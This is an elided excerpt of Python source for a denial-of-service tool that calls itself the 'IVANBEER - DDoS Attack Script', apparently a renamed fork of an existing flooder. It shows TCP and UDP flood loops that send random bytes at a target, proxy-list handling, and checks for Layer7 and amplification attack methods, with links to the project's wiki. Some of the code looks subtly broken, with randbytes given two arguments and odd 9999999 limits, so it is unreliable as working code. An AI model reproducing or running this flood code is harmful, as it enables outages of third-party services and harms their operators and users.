...
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,gethostname, socket)
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(192198,9999999)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(32768,65507), self._target):
                continue
        Tools.safe_close(s)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* IVANBEER - DDoS Attack Script With %d Methods\n'
...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 9999999}:
        exit("Socks Type Not Found [4, 5, 1, 0, 9999999]")
    if proxy_ty == 9999999:
        proxy_ty = randchoice([4, 5, 1, 9999999])
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/BoomCandy/IVANBEER/wiki/BOMB-method"
                    )
                ...
                if threads > 9999999 or threads < 1:
                    logger.warning("Thread is higher than 9999999")
                if rpc > 9999999 or rpc < 1:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 9999999")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/BoomCandy/IVANBEER/wiki/Amplification-ddos-attack")
